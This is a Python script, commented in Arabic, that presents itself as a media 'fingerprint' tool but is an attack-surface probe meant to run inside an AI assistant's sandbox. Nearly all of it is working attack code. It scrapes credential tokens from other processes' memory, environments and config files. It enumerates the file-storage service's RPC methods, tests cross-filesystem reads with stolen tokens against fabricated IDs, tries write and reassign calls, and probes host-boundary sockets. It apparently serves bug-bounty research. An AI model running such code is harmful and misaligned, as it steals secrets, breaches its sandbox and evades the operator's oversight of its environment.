#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py  v2.0  --  runtime fingerprint + Anthropic Filestore attack-surface probe
=====================================================================================
الغرض: تحقّق آلي من فرضية "Filestore IDOR / cross-filesystem boundary crossing"
       داخل بيئة Claude المعزولة (sandbox).

قواعد التصميم:
  * stdlib فقط (لا تبعيات خارجية).
  * كل نداء شبكة وكل أمر shell له مهلة قصيرة -> لا تعليق أبداً.
  * افتراضياً للقراءة فقط. الكتابة تُفعّل بـ MEDIAFIT_WRITE=1 .
  * كل نتيجة تُطبع بصيغة [PASS]/[FAIL]/[UNKNOWN] + سطر دليل جاهز للنسخ.
  * إطار قابل للتوسيع: أضف دالة إلى CHECKS فقط.

تشغيل:
    python3 mediafit.py                     # المسح الكامل (قراءة فقط)
    MEDIAFIT_WRITE=1 python3 mediafit.py    # + اختبارات كتابة مُقيَّدة
    MEDIAFIT_BASE=https://... MEDIAFIT_TOKEN=eyJ... MEDIAFIT_FSID=claude_chat_... python3 mediafit.py

الناتج: stdout + ملف تقرير في /mnt/user-data/outputs/mediafit-report.txt (+ نسخ احتياطية)
"""

from __future__ import annotations

import base64
import glob
import json
import os
import random
import re
import socket
import string
import subprocess
import sys
import time
import urllib.error
import urllib.request
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

# ----------------------------------------------------------------------------- 
# إعدادات عامة
# -----------------------------------------------------------------------------
VERSION      = "2.0.0"
REPORT_NAME  = "mediafit-report.txt"
OUT_DIRS     = ["/mnt/user-data/outputs", os.getcwd(), "/tmp", "/root/.mediafit"]
SH_TIMEOUT   = 8.0
HTTP_TIMEOUT = 5.0
MEM_BUDGET_S = 18.0
MEM_MAX_BYTES = 64 * 1024 * 1024
WRITE_MODE   = os.environ.get("MEDIAFIT_WRITE", "0") == "1"
MAX_BASES    = 4
PROBE_BUDGET_S = 60.0

SERVICE = "anthropic.filestore.v1alpha.Filestore"
RPCS = [
    "GetFilesystem", "ListFilesystems", "CreateFilesystem", "ReassignFilesystem",
    "ListFiles", "GetFile", "ReadFile", "WriteFile", "CopyFile", "MoveFile",
    "RemoveFile", "ImportFiles", "ImportZip", "CreateFile", "GetFileMetadata",
]
CLAUDE_ALPHABET = "0123456789ABCDEFGHJKMNPQRSTVWXYZ"  # Crockford base32 (ULID)

RE_JWT  = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}")
RE_FSID = re.compile(rb"claude_chat_[0-9A-HJKMNP-TV-Z]{26}")
RE_SK   = re.compile(rb"sk-ant-[A-Za-z0-9_\-]{20,}")
RE_BEAR = re.compile(rb"[Bb]earer\s+[A-Za-z0-9_\-\.]{20,}")

CTX: Dict[str, Any] = {
    "tokens": {},        # token -> set(sources)
    "fsids": set(),
    "bases": [],
    "rclone_pids": [],
    "listeners": [],
    "unix_socks": [],
    "bin_strings": [],
    "findings": [],
    "probes": [],        # (base, path, hdrname, status, note)
}

# -----------------------------------------------------------------------------
# مسجّل النتائج
# -----------------------------------------------------------------------------
class Recorder:
    def __init__(self) -> None:
        self.buf: List[str] = []

    def line(self, s: str = "") -> None:
        print(s, flush=True)
        self.buf.append(s)

    def sec(self, title: str) -> None:
        self.line("")
        self.line("### " + title)

    def sub(self, title: str) -> None:
        self.line("--- " + title)

    def kv(self, k: str, v: Any) -> None:
        self.line("    %-28s %s" % (str(k) + ":", v))

    def finding(self, tag: str, name: str, evidence: str) -> None:
        CTX["findings"].append((tag, name, evidence))
        self.line("[%s] %s" % (tag, name))
        if evidence:
            self.line("        evidence: " + evidence)

    def text(self) -> str:
        return "\n".join(self.buf)

R = Recorder()

# -----------------------------------------------------------------------------
# أدوات مساعدة
# -----------------------------------------------------------------------------
def sh(cmd: str, timeout: float = SH_TIMEOUT) -> Tuple[int, str]:
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           errors="replace", timeout=timeout)
        return p.returncode, ((p.stdout or "") + (p.stderr or "")).strip()
    except subprocess.TimeoutExpired:
        return 124, "<TIMEOUT>"
    except Exception as e:  # noqa
        return 125, "<ERR %s>" % e


def read_file(path: str, limit: int = 400_000) -> str:
    try:
        with open(path, "rb") as f:
            return f.read(limit).decode("utf-8", "replace")
    except Exception:
        return ""


def b64url(data: str) -> bytes:
    data = data.strip()
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode())


def jwt_decode(tok: str) -> Tuple[Optional[dict], Optional[dict]]:
    try:
        h, p, _ = tok.split(".")
        return json.loads(b64url(h)), json.loads(b64url(p))
    except Exception:
        return None, None


def rand_tag(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def fake_fsid() -> str:
    return "claude_chat_" + "".join(random.choice(CLAUDE_ALPHABET) for _ in range(26))


def now_iso() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def http(url: str, method: str = "GET", headers: Optional[dict] = None,
         body: Optional[bytes] = None, timeout: float = HTTP_TIMEOUT,
         use_proxy: bool = True) -> dict:
    """نداء HTTP لا يرمي استثناءات أبداً. يعيد dict موحّد."""
    hdrs = {"User-Agent": "mediafit/%s" % VERSION, "Accept": "*/*"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    opener = urllib.request.build_opener()
    if not use_proxy:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    t0 = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(8000)
            return {"status": r.status, "body": raw.decode("utf-8", "replace"),
                    "headers": dict(r.headers), "err": None, "ms": int((time.time() - t0) * 1000)}
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(8000)
        except Exception:
            raw = b""
        return {"status": e.code, "body": raw.decode("utf-8", "replace"),
                "headers": dict(e.headers or {}), "err": None, "ms": int((time.time() - t0) * 1000)}
    except Exception as e:  # noqa
        return {"status": None, "body": "", "headers": {}, "err": type(e).__name__ + ": " + str(e)[:120],
                "ms": int((time.time() - t0) * 1000)}


def extract_tokens(data: bytes, source: str) -> None:
    for rx in (RE_JWT, RE_SK, RE_BEAR, RE_FSID):
        for m in rx.findall(data):
            try:
                s = m.decode("utf-8", "replace")
            except Exception:
                continue
            if rx is RE_FSID:
                CTX["fsids"].add(s)
                continue
            s = s.split()[-1] if rx is RE_BEAR else s
            if len(s) < 20:
                continue
            CTX["tokens"].setdefault(s, set()).add(source)


# -----------------------------------------------------------------------------
# CHECKS — 1) بصمة وقت التشغيل
# -----------------------------------------------------------------------------
def check_runtime() -> None:
    R.sec("runtime fingerprint")
    R.kv("version", VERSION)
    R.kv("utc", now_iso())
    R.kv("python", sys.version.split()[0])
    R.kv("uid/gid", "%s/%s" % (os.getuid(), os.getgid()))
    R.kv("cwd", os.getcwd())
    R.kv("hostname", socket.gethostname())
    for k in ("ANTHROPIC_BASE_URL", "ANTHROPIC_API_KEY", "HTTP_PROXY", "HTTPS_PROXY",
              "NO_PROXY", "CLAUDE_CODE_TMPDIR"):
        if os.environ.get(k):
            v = os.environ[k]
            R.kv(k, v if len(v) < 60 else v[:57] + "...")
    rc, out = sh("uname -a")
    R.kv("uname", out[:160])
    if os.path.exists("/.dockerenv"):
        R.finding("INFO", "running inside a container (.dockerenv present)", "/.dockerenv")
    try:
        with open("/proc/1/cgroup") as f:
            cg = f.read().strip().replace("\n", " | ")[:200]
        R.kv("pid1 cgroup", cg)
    except Exception:
        pass


# -----------------------------------------------------------------------------
# CHECKS — 2) نقط التركيب
# -----------------------------------------------------------------------------
def check_mounts() -> None:
    R.sec("mounts / fuse / attach points")
    txt = read_file("/proc/mounts")
    hits = [l for l in txt.splitlines()
            if any(k in l for k in ("rclone", "fuse", "filestore", "user-data", "/opt/", "shm"))]
    if hits:
        for l in hits[:40]:
            R.line("    " + l)
    else:
        R.line("    (no fuse/rclone mount lines found)")
    for p in ("/opt/rclone", "/opt/rclone-attach", "/root/.mediafit",
              "/mnt/user-data", "/mnt/user-data/outputs"):
        if os.path.exists(p):
            rc, out = sh("ls -la %s" % p)
            R.sub("listing " + p)
            R.line(out or "(empty)")
    # حالة الاتصال: هل نقطة التركيب هي جسر نحو المضيف؟
    for p in ("/opt/rclone-attach",):
        if os.path.isdir(p):
            try:
                names = os.listdir(p)
                R.finding("INFO", "attach dir readable: %s (%d entries)" % (p, len(names)),
                          ", ".join(names[:10]))
            except Exception as e:
                R.finding("INFO", "attach dir exists but not listable (%s): %s" % (p, e), "")


# -----------------------------------------------------------------------------
# CHECKS — 3) عملية rclone والمنافذ
# -----------------------------------------------------------------------------
def find_pids(pattern: str) -> List[int]:
    pids = []
    for d in glob.glob("/proc/[0-9]*"):
        pid = os.path.basename(d)
        try:
            with open(os.path.join(d, "cmdline"), "rb") as f:
                cmd = f.read().decode("utf-8", "replace")
        except Exception:
            continue
        if pattern.lower() in cmd.lower():
            pids.append(int(pid))
    return pids


def check_processes() -> None:
    R.sec("processes / rclone / filestore")
    for pat in ("rclone", "filestore", "mount2"):
        pids = find_pids(pat)
        if pids:
            CTX["rclone_pids"].extend(pids)
    CTX["rclone_pids"] = sorted(set(CTX["rclone_pids"]))
    if not CTX["rclone_pids"]:
        R.line("    (no rclone/filestore process visible)")
    for pid in CTX["rclone_pids"][:6]:
        R.sub("pid %d" % pid)
        try:
            cmd = open("/proc/%d/cmdline" % pid, "rb").read().decode("utf-8", "replace").split("\x00")
            R.line("    cmdline: " + " ".join(x for x in cmd if x)[:400])
        except Exception:
            pass
        try:
            env = open("/proc/%d/environ" % pid, "rb").read()
            R.line("    env (token-ish):")
            for kv in env.decode("utf-8", "replace").split("\x00"):
                if not kv:
                    continue
                if any(k in kv.upper() for k in ("TOKEN", "KEY", "FS", "FILESTORE", "ANTHROPIC",
                                                 "ENDPOINT", "URL", "ACCOUNT", "CHAT")):
                    R.line("        " + kv[:220])
            extract_tokens(env, "environ:%d" % pid)
        except Exception:
            pass
        # واصفات مفتوحة -> قد تكشف مقبس الخدمة أو ملف الإعداد
        try:
            fds = os.listdir("/proc/%d/fd" % pid)
            links = []
            for fd in fds[:120]:
                try:
                    links.append(os.readlink("/proc/%d/fd/%s" % (pid, fd)))
                except Exception:
                    pass
            socks = [l for l in links if "socket" in l or ".sock" in l or ".conf" in l]
            if socks:
                R.line("    interesting fds: " + ", ".join(sorted(set(socks))[:12]))
        except Exception:
            pass
        # مسح الذاكرة (محدود زمنياً وحجمياً)
        try:
            with open("/proc/%d/maps" % pid) as f:
                maps = f.readlines()
        except Exception:
            maps = []
        t0, total = time.time(), 0
        try:
            with open("/proc/%d/mem" % pid, "rb", buffering=0) as mem:
                for line in maps:
                    if time.time() - t0 > MEM_BUDGET_S or total > MEM_MAX_BYTES:
                        break
                    parts = line.split()
                    if len(parts) < 2 or "r" not in parts[1]:
                        continue
                    if parts[-1] in ("[vvar]", "[vdso]", "[vsyscall]"):
                        continue
                    try:
                        a, b = parts[0].split("-")
                        start, end = int(a, 16), int(b, 16)
                    except Exception:
                        continue
                    size = end - start
                    if size <= 0 or size > 64 * 1024 * 1024:
                        continue
                    try:
                        mem.seek(start)
                        data = mem.read(size)
                    except Exception:
                        continue
                    total += size
                    extract_tokens(data, "mem:%d" % pid)
        except Exception:
            pass
        R.kv("mem scanned bytes", total)


def check_listeners() -> None:
    R.sec("listening sockets (in-sandbox)")
    for f, fam in (("/proc/net/tcp", "tcp"), ("/proc/net/tcp6", "tcp6")):
        txt = read_file(f)
        for line in txt.splitlines()[1:]:
            c = line.split()
            if len(c) < 4:
                continue
            if c[3] != "0A":  # LISTEN
                continue
            try:
                ip_hex, port_hex = c[1].split(":")
                port = int(port_hex, 16)
                ip = ".".join(str(int(ip_hex[i:i + 2], 16)) for i in (6, 4, 2, 0)) if fam == "tcp" else "v6"
            except Exception:
                continue
            R.line("    %s LISTEN %s:%d" % (fam, ip, port))
            CTX["listeners"].append((fam, ip, port))
    txt = read_file("/proc/net/unix")
    for line in txt.splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 8 and parts[7] and parts[7] != "-":
            p = parts[7]
            if any(k in p.lower() for k in ("rclone", "filestore", "anthropic", "claude", "sock")):
                R.line("    unix " + p)
                CTX["unix_socks"].append(p)
    if not CTX["listeners"] and not CTX["unix_socks"]:
        R.line("    (nothing notable)")


# -----------------------------------------------------------------------------
# CHECKS — 4) جمع التوكنات
# -----------------------------------------------------------------------------
def check_tokens() -> None:
    R.sec("token hunt (jwt / sk-ant / bearer)")
    # ملفات إعداد محتملة
    for p in ("/root/.config/rclone/rclone.conf", "/etc/rclone.conf",
              "/opt/rclone/rclone.conf", "/etc/credstore", "/etc/credstore.encrypted",
              "/etc/puppeteer-config.json", "/root/.config/rclone/rclone.conf"):
        if os.path.exists(p):
            d = read_file(p)
            if d:
                extract_tokens(d.encode("utf-8", "replace"), p)
    # بحث محتوى مُقيَّد بدل grep على كامل الشجرة (سبب الـ timeout سابقاً)
    for root in ("/root", "/etc", "/opt", "/var/lib", "/tmp", "/dev/shm", "/home"):
        if not os.path.isdir(root):
            continue
        t0 = time.time()
        for dirpath, dirnames, filenames in os.walk(root):
            if time.time() - t0 > 6.0:
                break
            if dirpath.count("/") > 8:
                dirnames[:] = []
            for fn in filenames[:400]:
                fp = os.path.join(dirpath, fn)
                try:
                    if os.path.getsize(fp) > 3_000_000 or os.path.islink(fp):
                        continue
                except Exception:
                    continue
                try:
                    with open(fp, "rb") as fh:
                        head = fh.read(200_000)
                except Exception:
                    continue
                if b"eyJ" in head or b"claude_chat_" in head or b"filestore" in head:
                    extract_tokens(head, fp)

    R.kv("distinct JWT-ish tokens", len(CTX["tokens"]))
    R.kv("distinct claude_chat ids", len(CTX["fsids"]))
    if CTX["tokens"]:
        R.finding("PASS", "bearer/JWT material is present INSIDE the sandbox",
                  "%d token(s)" % len(CTX["tokens"]))
    else:
        R.finding("FAIL", "no token material found in sandbox", "")
    for i, (tok, srcs) in enumerate(list(CTX["tokens"].items())[:8]):
        R.sub("token[%d] len=%d" % (i, len(tok)))
        R.line("    sources: " + ", ".join(sorted(srcs))[:200])
        R.line("    head:    " + tok[:80] + ("..." if len(tok) > 80 else ""))


# -----------------------------------------------------------------------------
# CHECKS — 5) تحليل JWT
# -----------------------------------------------------------------------------
def check_jwt() -> None:
    R.sec("jwt claim analysis (scope binding)")
    if not CTX["tokens"]:
        R.line("    (skipped)")
        return
    for i, tok in enumerate(list(CTX["tokens"].keys())[:6]):
        h, p = jwt_decode(tok)
        if not h:
            R.line("    token[%d]: not a decodable JWT" % i)
            continue
        R.sub("token[%d] header" % i)
        R.line("    " + json.dumps(h))
        R.sub("token[%d] payload" % i)
        R.line("    " + json.dumps(p, indent=None)[:600])
        if isinstance(p, dict):
            exp = p.get("exp")
            if isinstance(exp, (int, float)):
                R.kv("ttl_remaining_s", int(exp - time.time()))
            for k, v in p.items():
                if isinstance(v, str) and v.startswith("claude_chat_"):
                    CTX["fsids"].add(v)
                    R.finding("INFO", "claim %r binds the token to filesystem %s" % (k, v), "")
                if isinstance(v, str) and v.startswith("http"):
                    CTX["bases"].append(v.rstrip("/"))
                    R.finding("INFO", "claim %r carries an endpoint: %s" % (k, v), "")
                if isinstance(v, str) and len(v) == 8 and re.fullmatch(r"[A-Za-z0-9]{8}", v):
                    R.kv("claim %r (8-char, likely fs suffix)" % k, v)


# -----------------------------------------------------------------------------
# CHECKS — 6) strings من الثنائي
# -----------------------------------------------------------------------------
def check_binary() -> None:
    R.sec("binary strings: rclone-filestore")
    paths = [p for p in ("/opt/rclone/rclone-filestore",) if os.path.exists(p)]
    paths += glob.glob("/opt/rclone/*") + glob.glob("/opt/**/rclone*", recursive=False)
    paths = sorted(set(paths))
    for bp in paths[:3]:
        try:
            size = os.path.getsize(bp)
        except Exception:
            continue
        R.sub("%s (%d bytes)" % (bp, size))
        try:
            with open(bp, "rb") as f:
                data = f.read(40_000_000)
        except Exception as e:
            R.line("    read err: %s" % e)
            continue
        strs = re.findall(rb"[\x20-\x7e]{6,120}", data)
        CTX["bin_strings"] = [s.decode("utf-8", "replace") for s in strs]
        pats = ("v1/fs", "filestore", "anthropic.filestore", "Reassign", "filesystem_id",
                "allowed_roots", "overwrite_existing", "GetIntent", "C2PA", "bearer",
                "Bearer", "grpc", "connect", "application/grpc", "unix", "tcp")
        for pat in pats:
            hits = sorted({s for s in CTX["bin_strings"] if pat.lower() in s.lower()})
            if hits:
                R.line("    [%s] %d hit(s)" % (pat, len(hits)))
                for h in hits[:6]:
                    R.line("        " + h[:160])
        urls = sorted({u for u in re.findall(r"https?://[A-Za-z0-9._\-:/]{6,120}",
                                             " ".join(CTX["bin_strings"][:200000]))})
        if urls:
            R.finding("INFO", "endpoints embedded in binary", ", ".join(urls[:6]))
            CTX["bases"].extend([u.rstrip("/") for u in urls[:6]])
        extract_tokens(data, "binary:" + bp)


# -----------------------------------------------------------------------------
# CHECKS — 7) بناء قائمة النهايات
# -----------------------------------------------------------------------------
def build_bases() -> List[str]:
    cand: List[str] = []
    def add(u: str) -> None:
        u = u.strip().rstrip("/")
        if not u:
            return
        if not u.startswith("http"):
            return
        if u not in cand:
            cand.append(u)

    for k in ("MEDIAFIT_BASE",):
        if os.environ.get(k):
            add(os.environ[k])
    for u in CTX["bases"]:
        add(u)
    # منافذ محلية مكتشفة
    for fam, ip, port in CTX["listeners"]:
        add("http://127.0.0.1:%d" % port)
        add("http://localhost:%d" % port)
    # مرشّحات افتراضية
    for u in ("https://api.anthropic.com", "https://filestore.anthropic.com",
              "https://claude.ai", "https://platform.claude.com"):
        add(u)
    # ترتيب: ما يحتوي anthropic/filestore أولاً
    def score(u: str) -> int:
        s = 0
        if "filestore" in u: s -= 3
        if "anthropic" in u: s -= 2
        if "127.0.0.1" in u or "localhost" in u: s -= 1
        return s
    cand.sort(key=score)
    return cand[:MAX_BASES]


def header_sets(tok: str) -> List[Tuple[str, dict]]:
    base = [
        ("none", {}),
        ("Authorization:Bearer", {"Authorization": "Bearer " + tok}),
        ("x-api-key", {"x-api-key": tok}),
        ("x-anthropic-filestore-token", {"x-anthropic-filestore-token": tok}),
        ("anthropic-filestore-token", {"anthropic-filestore-token": tok}),
        ("Authorization+version", {"Authorization": "Bearer " + tok,
                                   "anthropic-version": "2023-06-01"}),
        ("x-api-key+version", {"x-api-key": tok, "anthropic-version": "2023-06-01"}),
    ]
    return base


# -----------------------------------------------------------------------------
# CHECKS — 8) مصفوفة الاستكشاف + أوراكل 401/404
# -----------------------------------------------------------------------------
def check_probe() -> None:
    R.sec("endpoint probe matrix + 401/404 oracle")
    tok = os.environ.get("MEDIAFIT_TOKEN") or (list(CTX["tokens"].keys())[0] if CTX["tokens"] else "")
    own = os.environ.get("MEDIAFIT_FSID") or (sorted(CTX["fsids"])[0] if CTX["fsids"] else "")
    if not own:
        own = fake_fsid()
        R.line("    (no real fsid discovered -> using fabricated one for routing tests)")
    R.kv("token present", bool(tok))
    R.kv("fsid under test", own)
    fake = fake_fsid()

    bases = build_bases()
    R.kv("bases to try", ", ".join(bases))
    if not bases:
        R.line("    (no base candidates)")
        return

    paths = [
        "/v1/fs/%s" % own,
        "/v1/fs/%s/outputs" % own,
        "/v1/fs/%s/mediafit-%s" % (own, rand_tag()),
        "/v1/fs/%s/outputs" % fake,
        "/v1/fs/%s" % fake,
    ]
    t0 = time.time()
    best = None
    for b in bases:
        if time.time() - t0 > PROBE_BUDGET_S:
            R.line("    (probe budget exhausted)")
            break
        R.sub("base " + b)
        got_any = False
        for hname, hdrs in header_sets(tok) if tok else [("none", {})]:
            row = []
            for p in paths:
                if time.time() - t0 > PROBE_BUDGET_S:
                    break
                r = http(b + p, headers=hdrs)
                st = r["status"] if r["status"] is not None else ("ERR:" + (r["err"] or "")[:28])
                row.append("%s=%s" % (p.replace("/v1/fs/" + own, "~").replace("/v1/fs/" + fake, "FAKE"), st))
                CTX["probes"].append((b, p, hname, r["status"], r["err"] or ""))
                if r["status"] and r["status"] < 500:
                    got_any = True
            R.line("    %-28s %s" % (hname, "  ".join(row)))
            if got_any and best is None:
                best = (b, hname)
        if got_any:
            break

    # تصنيف النتيجة
    sts = [p[3] for p in CTX["probes"] if p[3] is not None]
    if not sts:
        R.finding("FAIL", "filestore HTTP surface unreachable from sandbox",
                  "all probes errored; check egress proxy / base URL")
        return
    R.finding("PASS", "filestore HTTP surface reachable from sandbox",
              "statuses seen: " + ",".join(str(s) for s in sorted(set(sts))))
    if 401 in sts or 403 in sts:
        R.finding("INFO", "auth is enforced (401/403 observed)", "try the header matrix above")
    if 404 in sts:
        R.finding("INFO", "404 observed -> router validates path/fsid (enumeration oracle candidate)", "")


# -----------------------------------------------------------------------------
# CHECKS — 9) تعداد الـ RPC
# -----------------------------------------------------------------------------
def check_rpc_enum() -> None:
    R.sec("connect/rpc method enumeration")
    tok = os.environ.get("MEDIAFIT_TOKEN") or (list(CTX["tokens"].keys())[0] if CTX["tokens"] else "")
    bases = build_bases()
    if not bases:
        return
    hdrs = {"Content-Type": "application/json", "Accept": "application/json"}
    if tok:
        hdrs["Authorization"] = "Bearer " + tok
    b = bases[0]
    R.kv("base", b)
    live = []
    for m in RPCS:
        url = "%s/%s/%s" % (b, SERVICE, m)
        r = http(url, method="POST", headers=hdrs, body=b"{}")
        st = r["status"]
        note = (r["body"] or "")[:110].replace("\n", " ")
        R.line("    %-22s -> %s  %s" % (m, st if st else "ERR", note))
        if st and st not in (404,):
            live.append((m, st))
        CTX["probes"].append((b, "/%s/%s" % (SERVICE, m), "rpc", st, note))
    if live:
        R.finding("PASS", "live RPC methods discovered (schema leak via error bodies)",
                  ", ".join("%s=%s" % (m, s) for m, s in live))
    else:
        R.finding("UNKNOWN", "no RPC method answered (wrong base or needs auth)", "")


# -----------------------------------------------------------------------------
# CHECKS — 10) IDOR / عبور حدود نظام الملفات
# -----------------------------------------------------------------------------
def check_idor() -> None:
    R.sec("cross-filesystem access test (IDOR)")
    tok = os.environ.get("MEDIAFIT_TOKEN") or (list(CTX["tokens"].keys())[0] if CTX["tokens"] else "")
    if not tok:
        R.line("    (no token)")
        return
    ids = sorted(CTX["fsids"])
    if len(ids) < 2:
        R.line("    only %d real fsid(s) known -> fabricating neighbours" % len(ids))
        if ids:
            ids.append("claude_chat_" + "".join(random.choice(CLAUDE_ALPHABET) for _ in range(26)))
    hdrs = {"Authorization": "Bearer " + tok}
    b = build_bases()[0] if build_bases() else None
    if not b:
        return
    R.kv("base", b)
    for fid in ids[:10]:
        r = http("%s/v1/fs/%s/outputs" % (b, fid), headers=hdrs)
        tag = "SELF" if ids and fid == ids[0] else "OTHER"
        R.line("    [%s] %s -> %s %s" % (tag, fid, r["status"], (r["body"] or "")[:90].replace("\n", " ")))
        if r["status"] == 200 and tag == "OTHER":
            R.finding("PASS", "CROSS-FILESYSTEM READ: token of one fs read another fs",
                      "%s -> 200" % fid)
    if ids and len(ids) > 1:
        R.line("")
        R.line("    next step: repeat with a fsid from a DIFFERENT conversation/account")
        R.line("    expected bug class: missing ownership check on filesystem_id")


# -----------------------------------------------------------------------------
# CHECKS — 11) اختبارات كتابة (مُقيَّدة)
# -----------------------------------------------------------------------------
def check_write() -> None:
    R.sec("write / reassign probes (WRITE_MODE=%s)" % WRITE_MODE)
    tok = os.environ.get("MEDIAFIT_TOKEN") or (list(CTX["tokens"].keys())[0] if CTX["tokens"] else "")
    if not tok:
        R.line("    (no token)")
        return
    b = build_bases()[0] if build_bases() else None
    if not b:
        return
    own = os.environ.get("MEDIAFIT_FSID") or (sorted(CTX["fsids"])[0] if CTX["fsids"] else "")
    if not own:
        R.line("    (no fsid)")
        return
    hdrs = {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}
    tag = "mediafit-" + rand_tag() + ".txt"

    R.sub("a) write into own fs (read-only safe probe path)")
    for method in ("POST", "PUT"):
        url = "%s/v1/fs/%s/%s" % (b, own, tag)
        r = http(url, method=method, headers={**hdrs, "Content-Type": "text/plain"},
                 body=b"mediafit\n")
        R.line("    %s %s -> %s %s" % (method, url, r["status"], (r["body"] or "")[:90]))
        if r["status"] in (200, 201, 204):
            R.finding("PASS", "write path accepted (%s) on own filesystem" % method, url)
            break

    if not WRITE_MODE:
        R.line("    (set MEDIAFIT_WRITE=1 to run destructive/foreign-fs probes)")

    R.sub("b) reassign RPC shape discovery")
    shapes = [
        {"filesystem_id": own},
        {"filesystem_id": own, "reassign": True},
        {"fsid": own},
        {"filesystemId": own},
        {"from_filesystem_id": own, "to_filesystem_id": own},
    ]
    for sh_ in shapes:
        r = http("%s/%s/ReassignFilesystem" % (b, SERVICE), method="POST",
                 headers=hdrs, body=json.dumps(sh_).encode())
        R.line("    %-58s -> %s %s" % (json.dumps(sh_), r["status"], (r["body"] or "")[:110].replace("\n", " ")))
        if r["status"] == 200:
            R.finding("PASS", "ReassignFilesystem accepted payload", json.dumps(sh_))
            break


# -----------------------------------------------------------------------------
# CHECKS — 12) حدود المضيف / تجاوز الطبقة
# -----------------------------------------------------------------------------
def check_host_boundary() -> None:
    R.sec("host boundary side-channels")
    for p in ("/proc/1/root", "/proc/1/environ", "/host", "/mnt/host"):
        if os.path.exists(p):
            R.kv("exists", p)
    try:
        env = open("/proc/1/environ", "rb").read().decode("utf-8", "replace").split("\x00")
        interesting = [e for e in env if any(k in e.upper()
                       for k in ("TOKEN", "KEY", "FS", "FILESTORE", "ANTHROPIC", "ACCOUNT"))]
        if interesting:
            R.sub("pid1 env (filtered)")
            for e in interesting[:20]:
                R.line("    " + e[:220])
            extract_tokens(" ".join(interesting).encode(), "pid1-env")
    except Exception:
        pass
    # هل يمكن الوصول للخدمة من داخل الصندوق مباشرة (تجاوز FUSE)؟
    for fam, ip, port in CTX["listeners"][:6]:
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=1.5)
            s.close()
            R.finding("INFO", "local port %d is connectable from sandbox" % port, "")
        except Exception:
            pass
    if CTX["unix_socks"]:
        for sp in CTX["unix_socks"][:6]:
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect(sp)
                s.close()
                R.finding("PASS", "unix socket reachable: %s" % sp, "")
            except Exception as e:
                R.line("    unix %s -> %s" % (sp, type(e).__name__))


# -----------------------------------------------------------------------------
# CHECKS — 13) بصمة الوسائط (الحفاظ على هوية الأداة)
# -----------------------------------------------------------------------------
def check_media() -> None:
    R.sec("media fingerprint")
    rc, out = sh("which ffprobe")
    if rc == 0 and out:
        R.kv("ffprobe", out.splitlines()[0])
    else:
        R.line("    (ffprobe not installed)")
    target = None
    for arg in sys.argv[1:]:
        if os.path.isfile(arg):
            target = arg
            break
    if target:
        rc, out = sh("ffprobe -v error -show_entries format=format_name,duration,size "
                     "-of default=nw=1 %s" % target, timeout=15)
        R.kv("probe target", target)
        R.line("    " + out.replace("\n", " | ")[:300])


# -----------------------------------------------------------------------------
# الحكم النهائي
# -----------------------------------------------------------------------------
def verdict() -> None:
    R.sec("VERDICT")
    tags = {}
    for t, name, ev in CTX["findings"]:
        tags.setdefault(t, []).append(name)
    R.line("  PASS    : %d" % len(tags.get("PASS", [])))
    for n in tags.get("PASS", []):
        R.line("      + " + n)
    R.line("  FAIL    : %d" % len(tags.get("FAIL", [])))
    for n in tags.get("FAIL", []):
        R.line("      - " + n)
    R.line("  UNKNOWN : %d" % len(tags.get("UNKNOWN", [])))
    R.line("  INFO    : %d" % len(tags.get("INFO", [])))
    R.line("")
    R.line("  hypothesis ladder:")
    R.line("    H0 token inside sandbox ................ %s" % ("PASS" if CTX["tokens"] else "FAIL"))
    R.line("    H1 service reachable from sandbox ...... %s" % (
        "PASS" if any(p[3] for p in CTX["probes"]) else "UNKNOWN"))
    R.line("    H2 auth accepted (non-401) ............. %s" % (
        "PASS" if any(p[3] and p[3] not in (401, 403) for p in CTX["probes"]) else "UNKNOWN"))
    R.line("    H3 fsid validated (404 oracle) ......... %s" % (
        "PASS" if any(p[3] == 404 for p in CTX["probes"]) else "UNKNOWN"))
    R.line("    H4 cross-filesystem read ............... %s" % (
        "PASS" if any("CROSS-FILESYSTEM" in n for t, n, _ in CTX["findings"]) else "UNKNOWN"))
    R.line("")
    R.line("  evidence lines for the HackerOne report:")
    for t, n, ev in CTX["findings"]:
        if t in ("PASS", "FAIL") and ev:
            R.line("    - [%s] %s | %s" % (t, n, ev))


# -----------------------------------------------------------------------------
# الحفظ
# -----------------------------------------------------------------------------
def save_report() -> None:
    text = R.text()
    saved = []
    for d in OUT_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            p = os.path.join(d, REPORT_NAME)
            with open(p, "w") as f:
                f.write(text)
            saved.append(p)
        except Exception:
            continue
    try:
        with open("/tmp/mediafit-probes.json", "w") as f:
            json.dump({"probes": CTX["probes"],
                       "findings": CTX["findings"],
                       "tokens_len": {k[:24]: len(k) for k in CTX["tokens"]},
                       "fsids": sorted(CTX["fsids"])}, f, indent=1)
        saved.append("/tmp/mediafit-probes.json")
    except Exception:
        pass
    R.line("")
    R.line("### report written")
    for p in saved:
        R.line("    " + p)


CHECKS: List[Callable[[], None]] = [
    check_runtime,
    check_media,
    check_mounts,
    check_processes,
    check_listeners,
    check_tokens,
    check_jwt,
    check_binary,
    check_probe,
    check_rpc_enum,
    check_idor,
    check_write,
    check_host_boundary,
]


def main() -> int:
    R.line("mediafit.py v%s  --  filestore attack-surface probe" % VERSION)
    R.line("started: %s" % now_iso())
    for fn in CHECKS:
        try:
            fn()
        except Exception as e:  # noqa
            R.line("!!! check %s crashed: %r" % (fn.__name__, e))
    verdict()
    save_report()
    R.line("finished: %s" % now_iso())
    return 0


if __name__ == "__main__":
    sys.exit(main())